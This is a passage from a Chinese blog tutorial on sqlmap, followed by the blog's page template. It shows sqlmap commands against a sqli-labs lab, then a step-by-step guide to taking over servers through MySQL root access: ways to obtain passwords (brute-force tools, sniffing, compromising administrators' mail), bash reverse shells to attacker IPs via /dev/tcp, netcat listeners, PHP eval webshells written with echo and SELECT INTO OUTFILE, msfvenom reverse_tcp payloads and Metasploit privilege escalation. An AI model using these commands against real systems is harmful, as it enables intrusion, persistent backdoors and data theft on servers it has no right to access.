+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security –common-tables –batch</p>
+<p><img src="/sqlmap.assets/20200511164600263.png" alt="img"></p>
+<p><strong>2.暴力破解列名</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security -Tusers –common-columns –batch</p>
+<p><img src="/sqlmap.assets/20200511164614628.png" alt="img"></p>
+<h3 id="实例演示-读取文件-x2F-上传文件"><a href="#实例演示-读取文件-x2F-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”  –file-read “C:&#x2F;post.txt”</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997638.png" alt="img"></p>
+<p><strong>2写入文件</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”  –file-write “&#x2F;root&#x2F;1.txt”</p>
+<p> –file-dest “C:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;www&#x2F;1.txt”</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997639.png" alt="img"></p>
+<h3 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h3><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –os-shell</p>
+<p><strong>到此就完成了sqlmap的介绍，如果想了解更多关于Kali的工具，请关注我！</strong></p>
+<h1 id="使用sqlmap直连数据库获取webshell"><a href="#使用sqlmap直连数据库获取webshell" class="headerlink" title="使用sqlmap直连数据库获取webshell"></a>使用sqlmap直连数据库获取webshell</h1><p>在有些场景下，需要通过mysql直接连接来获取权限，例如通过暴力破解、嗅探等方法获取了账号及口令，服务器有可能未开放web服务。</p>
+<h3 id="0X001-适用场景"><a href="#0X001-适用场景" class="headerlink" title="0X001 适用场景"></a>0X001 适用场景</h3><p>1.获取了Mysql数据库root账号以及密码。</p>
+<p>2.可以访问3306端口以及数据库。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="0X002-扫描获取root账号的密码"><a href="#0X002-扫描获取root账号的密码" class="headerlink" title="0X002 扫描获取root账号的密码"></a>0X002 扫描获取root账号的密码</h3><p>  通常有下面一些方法来获取root账号的密码</p>
+<p>（1）phpMyAdmin多线程批量破解工具，下载地址：<a target="_blank" rel="noopener" href="http://www.test404.com/post-546.html">http://www.test404.com/post-546.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1c1LD6co%EF%BC%8C%E9%80%9A%E8%BF%87%E6%94%B6%E9%9B%86phpmyadmin%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E3%80%82">http://pan.baidu.com/s/1c1LD6co，通过收集phpmyadmin地址进行暴力破解。</a></p>
+<p>（2）代码泄露获取数据库账号和密码</p>
+<p>（3）文件包含读取配置文件中的数据库账号和密码</p>
+<p>（4）通过网络嗅探获取</p>
+<p>（5）渗透运维人员的邮箱及个人主机获取</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="0X003-获取shell"><a href="#0X003-获取shell" class="headerlink" title="0X003 获取shell"></a>0X003 获取shell</h3><p>1.通过sqlmap连接mysql获取shell</p>
+<p>（1）直接连接数据库</p>
+<p>sqlmap.py -d “mysql:&#x2F;&#x2F;root:<a href="mailto:&#x31;&#x32;&#51;&#52;&#x35;&#x36;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;">&#x31;&#x32;&#51;&#52;&#x35;&#x36;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;</a>:3306&#x2F;mysql”–os-shell</p>
+<p>（2）通过选择32位或者64位操作系统，获取webshell，执行</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;80800&gt;&amp;1</p>
+<p>（3）反弹到服务器192.168.1.3，在实际中192.168.1.3为外网独立IP。</p>
+<p>（4）通过echo命令生成shell：</p>
+<p>echo “<?php@eval($_POST['chopper']);?>” &gt;&#x2F;data&#x2F;www&#x2F;phpmyadmin&#x2F;1.php</p>
+<p>如果能够通过phpmyadmin管理数据库，则可以修改host为“%”并执行权限更新，下面命令可参考：</p>
+<p>use mysql;</p>
+<p>update userset host &#x3D; ‘%’ where user &#x3D; ‘root’;</p>
+<p>FLUSHPRIVILEGES ;</p>
+<p>注意：如果数据库中有多个host连接，修改时可能会导致数据库连接出问题。</p>
+<p>2.通过msf反弹</p>
+<p>（1）使用msfvenom生成msf反弹的php脚本木马，默认端口为4444：</p>
+<p>msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcpLHOST&#x3D;192.168.1.3 -f raw &gt; test.php</p>
+<p>（2）在独立IP或者反弹服务器上运行msf依次执行以下命令：</p>
+<p>msfconsole</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set LHOST 192.168.1.3 &#x2F;&#x2F;192.168.1.3为反弹监听服务器IP</p>
+<p>show options</p>
+<p>run 0 或者exploit</p>
+<p>（3）上传并执行php文件</p>
+<p>将test.php上传到192.168.1.2服务器上面，访问后即可获取msf反弹shell</p>
+<p>http:&#x2F;&#x2F; 192.168.1.2:8080&#x2F;test.php</p>
+<p>3.通过phpmyadmin管理界面查询生成webshll</p>
+<p>select ‘<?php @eval($_POST[cmd]);?>’INTOOUTFILE ‘D:&#x2F;work&#x2F;WWW&#x2F;antian365.php’</p>
+<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h3 id="0X004-一个实例"><a href="#0X004-一个实例" class="headerlink" title="0X004 一个实例"></a>0X004 一个实例</h3><p>1.直接连接mysql数据库</p>
+<p>执行命令：sqlmap.py -d”mysql:&#x2F;&#x2F;root:123456@2**.****.<strong>.</strong>:3306&#x2F;mysql” –os-shell</p>
+<p>如图1所示，需要设置后端数据库的架构，服务器多为64位，可以先选择64位即输入数字2进行测试，如果不是，可以退出后再次运行并选择。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70.jpeg" alt="img"></p>
+<p>图1选择服务器数据库所在架构</p>
+<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><p>2.上次udf文件</p>
+<p>  选择系统架构后，sqlmap会自动上传udf文件到服务器提权位置，如图2所示，会显示一些信息。Sqlmap不管获取的shell是否成功都显示os-shell提示符。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790511.jpeg" alt="img"></p>
+<p>图2获取os-shell</p>
+<h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>3.执行命令</p>
+<p> 针对相应的系统执行一些命令来验证是否真正获取shell，如图3所示，执行cat &#x2F;etc&#x2F;passwd命令来查看passwd文件内容，在本例中成功获取shell。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790522.jpeg" alt="img"></p>
+<p>图3执行命令</p>
+<h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><p>4.获取反弹shell</p>
+<p>虽然通过sqlmap获取了shell，但shell中操作不方便，可以在具备独立IP的服务器上执行：</p>
+<p> nc –vv –l –p 8080</p>
+<p>在sqlmap的shell段执行：</p>
+<p>bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;24.11.123.222&#x2F;8080 0&gt;&amp;1</p>
+<p>说明：</p>
+<p>（1）24.11.123.222为独立IP</p>
+<p>（2）需要在24.11.123.222上执行上面的nc监听命令</p>
+<p>（3）24.11.123.222服务器需要对8080端口放行，或者在防火墙中开放8080端口，如图4所示，成功反弹shell。</p>
+<p><img src="/sqlmap.assets/2019102916231769.jpg" alt="img"></p>
+<p>图4成功反弹shell</p>
+<h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><p>5.在服务器上生成webshell</p>
+<p>  在反弹的shell中通过执行locate *.php命令来定位服务器网页的真实路径，然后到该路径下，通过echo命令生成webshell，如图5所示，直接通过echo命令生成webshell一句话后门。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790523.jpeg" alt="img"></p>
+<p>图5生成webshell一句话后门文件</p>
+<h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><p>6.获取webshell</p>
+<p>使用中国菜刀一句话后面管理器创建记录并连接，如图6所示，成功获取webshell。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790524.jpeg" alt="img"></p>
+<p>图6获取webshell</p>
+<h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><p>7.通过phpmyadmin生成一句话</p>
+<p>如图7所示，通过phpmyadmin登录后台后，在sql查询中执行命令：</p>
+<blockquote>
+<p>select ‘<?php @eval($_POST[cmd]);?>’INTOOUTFILE ‘&#x2F;data&#x2F;www&#x2F;phpmyadmin&#x2F;eval.php’</p>
+<p>注意：通过phpmyadmin生成一句话需要知道网站的真实路径。可以通过查看数据库表以及phpinfo，登录后台，出错等来获取真实路径地址。</p>
+</blockquote>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790525.jpeg" alt="img"></p>
+<p>图7通过phpmyadmin获取webshell</p>
+<h3 id="-9"><a href="#-9" class="headerlink" title=""></a></h3><p>8.通过msf反弹获取shell</p>
+<p>本意是通过msfvenom命令生成msf反弹网页木马，通过msf获取shell，并进行提权，如图8所示，执行后，成功获取shell但真正能够通过msf进行提权成功的很少。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790526.jpeg" alt="img"></p>
+<p>图8msf反弹获取shell</p>
+<h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><p>9.msf提权参考</p>
+<p>（1）msf提权参考</p>
+<p>通过msf反弹shell，执行background将session放在后台运行，然后搜索可以利用的exploit来进行测试。下面是一些可以供参考的命令：</p>
+<blockquote>
+<p>background</p>
+<p>search “关键字”&#x2F;&#x2F;seach ssh seach “&#x2F;exploit&#x2F;linux&#x2F;local”</p>
+<p>use exploit&#x2F;linux……</p>
+<p>show options</p>
+<p>set session 1</p>
+<p>exploit</p>
+<p>sessions -i 1</p>
+<p>getuid</p>
+</blockquote>
+<p> 在msf平台上面执行search后，查找的结果中选择时间较新和excellent的成功提权的几率比较大，在提权前，最好更新msf到最新版本，另外一个搜索exploit的命令为：</p>
+<blockquote>
+<p>searchsploit  linux local 2.6.32 </p>
+</blockquote>
+<p>​     </p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Daniel</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://eatingcrime.github.io/2023/03/26/sqlmap/">https://eatingcrime.github.io/2023/03/26/sqlmap/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Daniel</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/03/26/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Msfvenom介绍及利用">
+                        
+                        <span class="card-title">Msfvenom介绍及利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/03/26/nmap/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="nmap详细使用教程">
+                        
+                        <span class="card-title">nmap详细使用教程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="917184825"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Daniel</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/eatingcrime" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1012375523@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=101237523" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 101237523" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+        <!-- <script src='https://unpkg.com/mermaid@latest/dist/mermaid.min.js'></script> -->
+        <script src='/libs/mermaid/mermaid.min.js'></script>
+        <script>
+          if (window.mermaid) {
+            mermaid.initialize({theme: 'forest'});
+          }
+        </script>
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
